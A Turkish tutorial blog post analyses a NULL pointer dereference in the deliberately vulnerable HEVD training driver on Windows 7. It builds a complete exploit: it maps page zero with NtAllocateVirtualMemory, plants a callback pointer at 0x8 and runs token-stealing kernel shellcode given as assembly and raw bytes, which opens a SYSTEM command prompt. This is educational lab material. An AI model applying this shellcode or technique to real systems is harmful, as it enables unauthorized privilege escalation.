---
title: WÇÇ - NULL Gösterici Çağırımı
---

Serinin ikinci yazısından tüm okuyuculara selamlar. Önceki yazıda bahsi geçen yazı dizisinin bu ikinci yazısında `NULL` değerine sahip bir gösterici çağırıldığında ortaya çıkan bir zafiyet türünü inceleyip "*exploit*" geliştireceğiz. Bu yazıda da tıpkı öncekinde olduğu gibi ilerleyelim, o halde öncelikle zafiyete sebep olan kısmı bi görelim...

## Zafiyetin Analizi

Öncelikle bu `NULL` gösterici çağırımı denen zafiyet nedir? Ne durumda oluşur? Bundan nasıl faydalanabiliriz sorularına çok kısa değinelim. Adından da anlaşılabileceği gibi `NULL` gösterici çağırımı demek bir kod parçasındaki geliştirici hatasından kaynaklanan bir durumdan ötürü çekirdekte `NULL` yani `0` adresi çağırılıp çalıştırılır, bu çağırılan adreste normal şartlar altında zararlı bir şey yapacak bir kod parçası yoktur, bırakın zararlıyı zaten hiçbir şey yoktur. Fakat bu zafiyet, ya eğer birileri oraya bir şeyler koyarsa ne olur diye düşünülerek gerçekleştirilen bir saldırıdır. Çook eski bir zafiyet türü olduğu için güncel Windows sürümlerinde bu zafiyet bildiğim kadarıyla çekirdek modunda çalışmıyor (Birtakım yöntemler yine de mevcut). Misal, Windows 8'den itibaren hafıza alanındaki ilk 64 kilobaytlık hafıza alanından hafıza tahsis işleminin gerçekleştirilmesini yasakladılar. Dolayısıyla "*exploit*" geliştiricileri bu adreste hafıza ayıramadıkları için zararlı işlemi gerçekleştirecek kodu da oraya koyamıyorlar (Biz zararlı diyoruz tabi ama onlara göre bu gayet de yararlı bir şey hehe).

Bu koruma önlemi `NULL` gösterici çağırımları sonucunda yetki yükseltme yapmayı engelledi fakat hala daha sistemin çökmesini tabi engelleyemiyorlar. E malum, her şeyi Windows çekirdeğinden beklememek lazım biraz da geliştiricilerin bilinçli olup yazdıkları kodlara dikkat etmeleri gerekiyor... Bu arada, bu koruma [NTVDM](https://en.wikipedia.org/wiki/Virtual_DOS_machine)(DOS uygulamalarının güncel sürümlerde desteklenebilmesi için kullanılan bi mekanizma) aktif edildiğinde devre dışı kalıyor fakat güncel Windows sürümlerinde **NTVDM** varsayılan olarak kapalı geliyor.

Zafiyetli sürücümüzde bu zafiyeti tetiklememiz için ihtiyacımız olan **IOCTL** kodumuz bu defa `0x22202B` (`HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE`). Bu zafiyetin tetiklenmesine vesile olacak ilk fonksiyonumuz şu şekilde:

```assembly
; NTSTATUS __fastcall NullPointerDereferenceIoctlHandler(PIRP Irp, PIO_STACK_LOCATION IrpSp))
NullPointerDereferenceIoctlHandler proc near
	sub     rsp, 28h
	mov     rcx, [rdx+20h]           -> UserBuffer
	mov     eax, STATUS_UNSUCCESSFUL -> Geri dönüş değeri
	test    rcx, rcx
	jz      short FAILED
	call    TriggerNullPointerDereference
FAILED:                           
	add     rsp, 28h
	retn
NullPointerDereferenceIoctlHandler endp
```

Öncekinden tek farkı bu defa iki adet parametre yok da, sadece bir tane var. O da zaten direk yine kullanıcı modundan bize ulaşıyor. Peki, `TriggerNullPointerDereference` fonksiyonu ne yapıyor bu veri ile ona bakalım hemen.

```assembly
	...
	...
	mov     rbx, rcx        	; rcx, kullanıcı modundan gelen veri
	...
	lea     r8d, [rsi+8]    	; Hizalama
	lea     r12d, [rsi+10h]
	mov     rdx, r12        	; Boyut
	call    ProbeForRead            ; Kullanıcı modu ve okuyabiliyor muyuz?
	mov     r8d, 'kcaH'     	; Tanımlayıcı etiket
	mov     rdx, r12        	; Boyut
	xor     ecx, ecx        	; NonPagedPool
	call    ExAllocatePoolWithTag   ; Bir sey icin alan ayır
	mov     rdi, rax                ; Ayrılan alan -> rdi ve rax yazmaçlarında
	cmp     rax, rsi                ; rsi = 0, rax da 0 mı? Eğer sıfırsa, alan ayıramadık
	jnz     short TAHSIS_TAMAM
	...
	...
TAHSIS_TAMAM:                           ; 0 değil, alan ayırdık
        ...
        mov     ebx, [rbx]              ; kullanıcı modundaki verinin ilk 4 baytını ebx'e al
        ...
	mov     r11d, 0BAD0B0B0h        ; r11d yazmacına 0xBAD0B0B0 değerini koy
	cmp     ebx, r11d               ; kullanıcı modundan gelen veri ile eşleşiyor mu?
	jnz     short IMZA_YOK          ; eşleşmiyor, o zaman istekte sıkıntı var çık
	mov     [rdi], r11d             ; ayrılan alanın en başına bu imzayı koy
	lea     rax, NullPointerDereferenceObjectCallback ; rax = NullPointerDereferenceObjectCallback
	mov     [rdi+8], rax            ; ikinci elemanı NullPointerDereferenceObjectCallback adresi yap
	...
	jmp     short CAGIR
	...
IMZA_YOK:                               
	mov     edx, 6B636148h  	; Tanımlayıcı Etiket
	mov     rcx, rdi        	; Tahsis edilen adres
	call    ExFreePoolWithTag
	mov     rdi, rsi                ; rdi = 0 oldu, yani ayrılan alan = NULL yapıldı
CAGIR:                                  
        ...
	call    qword ptr [rdi+8] -> AyrılanVeri->Fonksiyon()
	jmp     short CIKIS
	...
```

Evet mümkün olduğunca koddaki göz ardı edilebilir kısımları kaldırıp yorumlarla destekleme çalıştım. Kısaca özetlemek gerekirse fonksiyonumuza kullanıcı modundan bir veri geliyor, fonksiyon öncelikle kullanıcının gönderdiği veri alanını okuyup okuyamadığını test ediyor (`ProbeForRead`), devamında `ExAllocatePoolWithTag` fonksiyonuyla devamında kullanmak üzere bir hafıza alanı ayırıyor, eğer alan ayırma işlemi başarısız olursa fonksiyon geri dönüyor, eğer başarılı olursa öncelikle kullanıcının gönderdiği verinin ilk elemanının dört baytını okuyor, eğer bu okuduğu değer `0xBAD0B0B0` ise bu isteğin geçerli bir istek olduğunu anlıyor ve ayırdığı alanın ilk elemanına bu değer, ikinci alanına ise `NullPointerDereferenceObjectCallback` fonksiyonun adresini koyuyor, devamında gidip ikinci alana koyduğu fonksiyonu çağırıp çalıştırıyor (Bu fonksiyona takılmayın, yalnızca bir mesaj yazdırıyor). Eğer ki kullanıcı modunda gelen veriyi doğrulayamazsa, bu defa ayırdığı hafıza alanını serbest bırakıp bu alanın adresini tutan değişkeni de `NULL` yapıyor. Buraya kadar her şey güzel, peki sıkıntı ney? Şu, normal şartlar altında elbette ki ayırdığınız alanı serbest bıraktıktan sonra oradan bir veri çağırmaya çalışmazsınız, bu fonksiyon beklediğimiz gibi çalışmıyor artık hata geri döndürmenin zamanı geldi diye düşünürsünüz değil mi? Ama burada çağırılıyor. Çağırıldığı için çekirdek gidip `0x0 + 0x8` adresinine dallanmaya çalışıyor fakat orada bir şey olmadığı için başarısız oluyor.

Bu örnek size biraz absürd gelebilir, `hade lan bunu yapan kaldı mı` diye tepki verebilirsiniz, fakat `NULL` gösterici çağırma örneği(ve diğer bir çok zafiyet türü) illa bu koddaki mimari ile tetiklenecek diye bir şey yok. Adamın çalışan 10 bin satır kodu var, eğer biraz da düzensiz kod yazıyorsa böyle durumlarla karşılaşma olasılığı oldukça artıyor. Hatta ben size şöyle söyleyim, şu anda bile bilgisayarınızda kullandığınızı tahmin ettiğim bir güvenlik yazılımında, bir de sanallaştırma yazılımında bu ve daha da kritiği olan zafiyetler mevcut. İdareye yazdık açıkları kapayın dedik ama pek takan olmadı hehe...

Şimdi daha da netleştirmek için C kodunu görelim:

```c
NTSTATUS TriggerNullPointerDereference(IN PVOID UserBuffer) {
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
    PNULL_POINTER_DEREFERENCE NullPointerDereference = NULL;

    __try {
    	//
        // Bize gelen veriyi kontrol et, okunuyor mu ve
        // kullanıcı modunda mı?
        //
        ProbeForRead(UserBuffer,
                     sizeof(NULL_POINTER_DEREFERENCE),
                     (ULONG)__alignof(NULL_POINTER_DEREFERENCE));

        //
        // Veri yapımız icin alan ayir
        //
        NullPointerDereference = (PNULL_POINTER_DEREFERENCE)
                                  ExAllocatePoolWithTag(NonPagedPool,
                                                        sizeof(NULL_POINTER_DEREFERENCE),
                                                        (ULONG)POOL_TAG);
        //
        // Ayıramadın mı :(
        //
        if (!NullPointerDereference) {
            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }

        //
        // Kullanıcı modundan veriyi oku
        //
        UserValue = *(PULONG)UserBuffer;

        //
        // Gelen veri açıl susam açıl mı?
        //
        if (UserValue == MagicValue) {
        	//
        	// Evet, veri yapımızı doldur o zaman
        	//
            NullPointerDereference->Value = UserValue;
            NullPointerDereference->Callback = &NullPointerDereferenceObjectCallback;
        }
        else {
        	//
        	// Hayır değil :( O zaman ayırdığımız alanı geri ver
        	//
            ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);

            //
            // Alanımızı gösteren değişkeni NULL yap (DIKKAT!)
            //
            NullPointerDereference = NULL;
        }

#ifdef SECURE
        //
        // Güvenli: Normalde kodun böyle olması gerekir, lakin ayırdığınız
        // alan ile, o alanda yapacağınız işlem arasında çoook fazla
        // başka işlemler olabilir, o nedenle bu alan harbiden var mı
        // diye kontrol etmek çok çok iyi bir fikir
        //
        if (NullPointerDereference) {
        	//
        	// Evet, alan var, çağır o zaman fonksiyonumuzu!
        	// NOT: Burada her ne kadar bu değişken 0'dan farklı mı diye
        	// kontrol etsek de, aslında yine de kod patlayabilir. Neden?
        	// Çünkü yukarıda ExFreePoolWithTag'den sonra eğer değişkeni
        	// NULL yapmazsanız, bu defa da içerisinde bir şey olmayan
        	// bir adresi çağırırsınız...
        	//
            NullPointerDereference->Callback();
        }
#else
		//
        // Güvensiz: Al işte. Değişken hala var mı yok mu kimsenin 
        // umurunda değil, direkt gidip fonksiyonu çağırmış. Eee, o zaman
        // olacaklara katlanacak demektir.
        //
        NullPointerDereference->Callback();
#endif
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
    }

    return Status;
}
```

Evet, sanıyorum yorumlar ile birlikte gayet anlaşılır olmuştur. Yine de işin mantığında kafanıza yatmayan bir yer olursa yorumlarda sormaktan çekinmeyin. Çünkü zafiyetin neden meydana geldiğini tam olarak dimağlara yediremezsek, geri kalan her şey biraz havada kalıyor... Neyse, şimdi o zaman hemen işin karanlık taraflarına geçelim ve ufak ufak "*exploit*"i oluşturmaya başlayalım. 

## Zafiyetin Tetiklenmesi

Yukarıdaki koddan anladığımız kadarıyla zafiyeti tetiklemek istiyorsak çekirdek moduna göndereceğimiz veride, sürücünün aradığı `0xBAD0B0B0` dışında bir şey olması gerekiyor. Bu olduğu zaman kullanmak için ayırdığı alanı serbest bırakıp, bu alanı gösteren göstericiyi `NULL` yapacak, fakat sonrasında yine de gidip buradan bir fonksiyon göstericisi çağırmaya çalışacak. Bu nedenle de uygulama çökecek. O halde hemen doğrulayalım bakalım sahiden çökecek mi?

```c
#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)

int main()
{
	BOOL Result             = FALSE;
	DWORD Retval            = 0;
	ULONG SahteVeri	        = 0xBEBEB000; // Dikkat, beklediği değer değil farklı bi değer gönderiyoruz
	HANDLE hDeviceHandle    = INVALID_HANDLE_VALUE;
	const WCHAR* DeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	printf("*** Cekirdegi Kitliyoruz - NULL gosterici cagirimi ***\n");

	//
	// Surucuye tutamak al
	//
	hDeviceHandle = CreateFile(
		DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if(hDeviceHandle == INVALID_HANDLE_VALUE)
	{
		printf("Surucuye tutamak alamiyoruz?!\n");
		goto RETURN;
	}

	printf("Hop, tutamak geldi : %p\n", hDeviceHandle);

	Result = DeviceIoControl(
		hDeviceHandle,
		HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
		&SahteVeri,
		sizeof(SahteVeri),
		NULL,
		0,
		&Retval,
		NULL);

    printf("Evet, emaneti yolladik! Sonuc : %d\n", Result);
	system("cmd");

RETURN:

	if(hDeviceHandle)
	{
		CloseHandle(hDeviceHandle);
	}

    return 0;
}


```

Kodu çalıştırmadan önce, yine Windbg ile kontrolleri yapmamızı sağlayacak yerlere bir durma noktası koyalım bakalım:

```
1: kd> x HEVD!Null*
	fffff880`0535fdd4 HEVD!NullPointerDereferenceIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)
	fffff880`0535fc48 HEVD!NullPointerDereferenceObjectCallback (void)
1: kd> bp HEVD!NullPointerDereferenceIoctlHandler
1: kd> g
```

Evet şimdi kodu çalıştırıp devamında Windbg ile devam edelim, beklediğimiz şey `0x8` adresinin çağırılması. Bu arada şimdi aklıma geldi, yine Windows 7 64 bit kullanıyorum, eğer bunları 32 bit Windows üzerinde denerseniz gösterici boyutları da değişecektir doğal olarak `0x4` adresini çağıracaktır aklınızda bulunsun.

```
3: kd> r ebx
ebx=bebeb000
3: kd> u rip
HEVD!TriggerNullPointerDereference+0x124;
	fffff880`050ebd80 ba4861636b      mov     edx,6B636148h    ; Dikkat edin, kod şu anda ayırdığı hafıza alanını geri bırakıyor
	fffff880`050ebd85 488bcf          mov     rcx,rdi
	fffff880`050ebd88 ff158ac2ffff    call    qword ptr [HEVD!_imp_ExFreePoolWithTag (fffff880`050e8018)]
	fffff880`050ebd8e 488bfe          mov     rdi,rsi          ; Ayıran alanı gösteren arkadaş 0 yapıldı!!!!!
	fffff880`050ebd91 488d0dd80e0000  lea     rcx,[HEVD! ?? ::NNGAKEGL::`string' (fffff880`050ecc70)]
	fffff880`050ebd98 e8c9b2ffff      call    HEVD!DbgPrint (fffff880`050e7066)
	fffff880`050ebd9d ff5708          call    qword ptr [rdi+8] ; NULL GÖSTERİCİ ÇAĞIRILIYOR!
	fffff880`050ebda0 eb11            jmp     HEVD!TriggerNullPointerDereference+0x157 (fffff880`050ebdb3)
...
...
...
3: kd> r
rax=0000000000000000 rbx=00000000bebeb000 rcx=e18452ce238a0000
rdx=0000000000000028 rsi=0000000000000000 rdi=0000000000000000
rip=fffff880050ebd9d rsp=fffff88005d89780 rbp=fffffa8005b9c3b0
 r8=0000000000000065  r9=0000000000000003 r10=0000000000000000
r11=fffff88005d893a0 r12=0000000000000010 r13=0000000000000000
r14=0000000000000004 r15=fffffa8005bdb001
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
HEVD!TriggerNullPointerDereference+0x141:
fffff880`050ebd9d ff5708          call    qword ptr [rdi+8] ds:002b:00000000`00000008=????????????????

```

Evet, gördüğünüz gibi `call qword ptr [rdi+8]` makine kodu çalıştırıldığı sırada `rdi` yazmacı `0` değerini taşıyor, haliyle bu makine kodu `0x8` adresini çağırıyor. Orada da bir şey olmadığı için işletim sistemi bir istisna fırlatıyor, ve eğer yazılımı geliştiren kişi burada bir istisna işleyici kaydetmişse durumu kurtarıyor.

## "*Exploit*" Yazımı

Evet, geldik son bölümümüze. Şimdi bu zafiyeti yetkilerimizi yükseltmek için kullanacağız. Yukarıdaki örnekte ne gördük? Sürücüye `0x8` adresini çağırtabiliyoruz değil mi? O halde bu adrese bizim "*Token*" çalan "*shellcode*"umuzu koyarsak işimiz tamam demektir. Fakat bunu yapabilmek için öncelikle bu adresi kullanabilmemiz ve önceki yazıda kullandığımız "*shellcode*" üzerinde minik bir değişiklik yapmamız gerekiyor.

### `0x0` Adresinde Hafıza Alanı Ayırmak

Normal şartlar altında `0x0` adresinde hafıza ayıramıyoruz, hatta yukarıda dediğim gibi Winows 8'den sonra `0x0`'dan başlayan adres alanındaki ilk 64 kilobaytlık alanın tahsis edilmesini engellediler. Fakat bu yazıda biz Windows 7 kullandığımız için bu "*exploit*"i çalıştırabileceğiz. Fakat şu da var, eğer yanılmıyorsam Windows 7 çekirdeğinde de bir güncellemeden sonra aşağıda kullanacağımız fonksiyonu düzenlediler ve bu alanda hafıza tahsis etmesini engellediler. Nereden biliyorsun diye sorarsanız yazıyı yazarken Windows 7'yi son güncellemelere alayım dedim, aldığım zaman aşağıda göreceğiniz "*exploit*" çalışmamaya başladı. Devamında nedenini merak edip deşmeye başlayınca fonksiyonun içerisinde argüman olarak gelen taban adresinin `0x1000`'den düşük olması durumunda fonksiyon hata dönmeye başlıyordu. Dolayısıyla bir ihtimal aşağıdaki "*exploit*" sisteminizde çalışmayabilir fakat çalışmasa da siz bu zafiyet türünü öğrenmiş olacaksınız diye umuyorum.

Tamam, şimdi bu ayrıntıyı geçelim, eğer sistemimizde bu koruma önlemi alınmamış ise nasıl `0x0` adresinde hafıza alanı tahsis edeceğiz? Çok basit, `NtAllocateVirtualMemory` fonksiyonu ile. Bu fonksiyon normal şartlar altında dışarıya aktarılmamış bir fonksiyon, o nedenle tek yapmamız gereken şey fonksiyonun adresini çalışma zamanında çözüp o şekilde kullanmak. Bu fonksiyon ikinci parametresi olarak hafıza tahsisinin yapılacağı adresi istiyor, eğer `NULL` verilirse adresi kendi belirliyor, fakat eğer verilmez ise o adreste hafıza tahsis etmeye çalışıyor. Bu adrese `0` yazdığımızda istediğimizi elde edemiyoruz fakat eğer 1, 2, veya 3 gibi minik bir değer yazarsak, fonksiyon kendi içerisinde bu adres başlangıcını aşağıya doğru, sayfa boyutuna göre yuvarlama işleminden geçiriyor. Bu sayede biz mesela `1` adresini girersek, bu `0` değerine yuvarlanıyor. Böylece `0x0` adresinde hafıza tahsisi gerçekleştirmiş oluyoruz. Devamında ise yapmamız gereken tek şey, bu hafıza alanının `0x8` uzaklığına yetki yükseltme işlemini yapacak olan "*shellcode*"'u eklemek... 

Kullanacağımız hafıza tahsis fonksiyonunun ilk örneği şu şekilde:

```c
typedef NTSTATUS (WINAPI *p_NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect);
```

Devamında `0x0` adresinde hafıza tahsis etmek için fonksiyonu şu şekilde kullanıyoruz:

```c
PVOID BaseAddress =(PVOID)1;
SIZE_T Size       = 4096;
...
...
a_NtAllocateVirtualMemory = (p_NtAllocateVirtualMemory)GetProcAddress(
	GetModuleHandleA("ntdll.dll"),
	"NtAllocateVirtualMemory");
if (a_NtAllocateVirtualMemory == NULL)
{
	printf("Fonksiyonun adresini alamadik :(\n");
	goto RETURN;
}
NtStatus = a_NtAllocateVirtualMemory(
		GetCurrentProcess(),
		&BaseAddress,
		0,
		&Size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

if(NtStatus != STATUS_SUCCESS)
{
	printf("Alan ayiramadik : %x :(\n", NtStatus);
	goto RETURN;
}

//
// 0x0 + 0x8 uzaklığına, bizim "token" çalan "shellcode"umuzu koy
//
*(unsigned long long*)0x8 = (unsigned long long)&cakal;
...
...
```

### "*Shellcode*"'da Minik Düzeltme

Hatırlarsanız önceki "*exploit*"imizin sonunda sistemin çökmeden çalışmaya devam edebilmesi için yığını temizleyen bir komut koymuştuk. Şimdiki örneğimizde "*shellcode*"umuzda değişen tek şey artık buna ihtiyaç olmaması. Nedeni gayet basit, lakin artık yığını bozmuyoruz, çalışma nasıl gerekiyorsa o şekilde dışarıdan bir müdahale olmadan devam ediyor. Bu nedenle gerekli temizlikleri fonksiyonun kendisi zaten yapıyor, dolayısıyla bizim ek bir şey yapmamıza gerek yok. Netice olarak bu defa kullanacağımız "*shellcode*"muz şu şekilde:

```assembly
[BITS 64]

%define SYSTEM_PID 0x4
%define TOKEN_OFFSET 0x80
%define KTHREAD_OFFSET 0x188
%define EPROCESS_OFFSET 0x70
%define PROCESSLIST_OFFSET 0x188
%define CURRENTPROC_OFFSET 0x208

;------------------------------------------------------------------------------
    push rax                            ; rax yazmacını yigina yedekle (geri donus degeri)
    mov rdx, [gs:KTHREAD_OFFSET]        ; Çalışan işlemciğin KTHREAD veri yapısı
    mov r11, [rdx + EPROCESS_OFFSET]    ; r11 = Şimdiki İşlemin EPROCESS yapisi
    mov r10, [r11 + PROCESSLIST_OFFSET] ; r10 = ActiveProcessLinks (LIST_ENTRY)
    mov rcx, [r10]                      ; rcx = ListEntry->Next, yani sonraki EPROCESS
sistemi_bul:
    mov rdx, [rcx - 8]                  ; rdx = İncelenen işlemin belirteci 
    cmp rdx, SYSTEM_PID                 ; 4 mü?
    jz bulundu                          ; eveeet!
    mov	rcx, [rcx]                      ; değil, rcx = ListEntry->Next
    jmp sistemi_bul                     ; yukarı kaç
bulundu:
    mov rax, [rcx + TOKEN_OFFSET]       ; Aha! Sistem geldi, Token adresini al
    and al, 0xf0                        ; İşimize yaramayan son 4 biti sıfırla
bizi_yukselt:
    mov [r11 + CURRENTPROC_OFFSET], rax ; Bizim işlemin "Token"inin yerine koy
cikis:
    pop rax                             ; rax yazmacini geri al
    ret                                 ; Geldiğin yere geri dön
```

Bu arada, burada aslında rax yazmacını en başta yedekleyip tekrar geri almaktansa, direkt olarak `xor rax, rax` yapıp sıfırlamak daha mantıklı olabilir (0  = STATUS_SUCCESS). Malum, `rax` değişkeni fonksiyonun durum bilgisini geri dönüyor, kodda en başta bu başarılı diye tanımlandığı için ben oraya dokunmadım fakat dilerseniz az önce bahsettiğim şekilde de yapabilirsiniz.

Sonuç olarak bu zafiyeti "*exploit*" edecek kodumuzun son hali şu şekilde:

```c
#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS (WINAPI *p_NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect);

int main()
{
	BOOL Result             = FALSE;
	NTSTATUS NtStatus       = STATUS_UNSUCCESSFUL;
	DWORD Retval            = 0;
	ULONG SahteVeri         = 0xBEBEB000;
	HANDLE hDeviceHandle    = INVALID_HANDLE_VALUE;
	p_NtAllocateVirtualMemory a_NtAllocateVirtualMemory = NULL;
	const WCHAR* DeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	PVOID BaseAddress =(PVOID)1;
	SIZE_T Size       = 4096;

	printf("*** Cekirdegi Kitliyoruz - NULL gosterici cagirimi ***\n");

	//
	// "Token" calan parcacik
	//
	unsigned char cakal[57] = {
		0x50, 0x65, 0x48, 0x8B, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4C, 0x8B,
		0x5A, 0x70, 0x4D, 0x8B, 0x93, 0x88, 0x01, 0x00, 0x00, 0x49, 0x8B, 0x0A,
		0x48, 0x8B, 0x51, 0xF8, 0x48, 0x83, 0xFA, 0x04, 0x74, 0x05, 0x48, 0x8B,
		0x09, 0xEB, 0xF1, 0x48, 0x8B, 0x81, 0x80, 0x00, 0x00, 0x00, 0x24, 0xF0,
		0x49, 0x89, 0x83, 0x08, 0x02, 0x00, 0x00, 0x58, 0xC3
	};

	//
	// Parcacigin alanini calistirilabilir yap
	//
	DWORD oldProtect;
	VirtualProtect(cakal, sizeof(cakal), PAGE_EXECUTE_READWRITE, &oldProtect);

	//
	// Surucuye tutamak al
	//
	hDeviceHandle = CreateFile(
		DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if(hDeviceHandle == INVALID_HANDLE_VALUE)
	{
		printf("Surucuye tutamak alamiyoruz?!\n");
		goto RETURN;
	}

	printf("Hop, tutamak geldi : %p\n", hDeviceHandle);

	//
	// '0' adresini hazırla
	//
	a_NtAllocateVirtualMemory = (p_NtAllocateVirtualMemory)GetProcAddress(
		GetModuleHandleA("ntdll.dll"),
		"NtAllocateVirtualMemory");
	if (a_NtAllocateVirtualMemory == NULL)
	{
		printf("Fonksiyonun adresini alamadik :(\n");
		goto RETURN;
	}

	//
	// Alan ayır, BaseAddress değeri olarak kullandığımız 1, 0'a düşürülecek hizalama
	// olayının sağlanabilmesi için
	//
	NtStatus = a_NtAllocateVirtualMemory(
		GetCurrentProcess(),
		&BaseAddress,
		0,
		&Size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if(NtStatus != STATUS_SUCCESS)
	{
		printf("Alan ayiramadik : %x :(\n", NtStatus);
		goto RETURN;
	}

	//
	// 0x0 + 0x8 uzaklığına, bizim "token" çalan "shellcode"umuzu koy
	//
	*(unsigned long long*)0x8 = (unsigned long long)&cakal;

	//
	// Hadi (b)akalım :P
	//
	Result = DeviceIoControl(
		hDeviceHandle,
		HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
		&SahteVeri,
		sizeof(SahteVeri),
		NULL,
		0,
		&Retval,
		NULL);

        printf("Evet, emaneti yolladik! Sonuc : %d\n", Result);
	system("cmd");

RETURN:

	if(hDeviceHandle)
	{
		CloseHandle(hDeviceHandle);
	}

    return 0;
}
```

Kodu derleyip çalıştırdığınızda, önceki yazımızda olduğu gibi yetkileri yükseltilmiş bir komut satırı sizi bekliyor olacak. Tabii dediğim gibi eğer sisteminizde bu zafiyet türünü engelleyen önlem yok ise. Olduuukça eski bir zafiyet olduğu için zaten günümüzde hâlâ buradan ekmek yenmesi insanı biraz şaşırtıyor fakat tüm o önlemlere rağmen yine de bu tür zafiyetlerden faydalanmak mümkün olabiliyor.

Sevgiler
